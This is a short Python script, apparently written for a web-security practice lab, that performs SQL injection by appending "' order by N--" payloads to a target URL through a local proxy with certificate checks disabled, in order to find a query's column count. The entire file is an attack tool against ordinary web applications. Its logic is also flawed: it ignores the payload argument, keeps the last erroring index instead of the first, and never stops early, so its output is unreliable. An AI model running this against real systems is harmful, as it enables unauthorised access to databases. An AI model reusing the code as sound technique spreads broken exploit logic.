import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8087', 'https':'http://127.0.0.1:8087'}

def exploit_sqli(url, uri, payload):
    result = 0
    # columns = 'NULL'
    for i in range(50):
        payload = f"' order by {i}--"
        # payload1 = f"' UNION SELECT {columns}--"
        res = requests.get(url+uri+payload, proxies=proxies, verify=False)
        if res.status_code == 500 :
            result = i
        # columns += ',NULL'
        
    return result

if __name__ == '__main__' :
    try:
        url = sys.argv[1].strip()
        uri = sys.argv[2].strip()
        payload = sys.argv[3]
    except IndexError:
        print('[-] Usage : %s <url> <uri> <payload>' % sys.argv[0])
        print('[-] Example : %s www.example.com "/Filter?value=Gifts" "\' or 1=1"' % sys.argv[0])
        sys.exit(-1)
        
    columns = exploit_sqli(url, uri, payload)
    
    if  columns :
        print("[+] SQLi columns number is : %s." % columns)
    else :
        print("[-] SQL fail")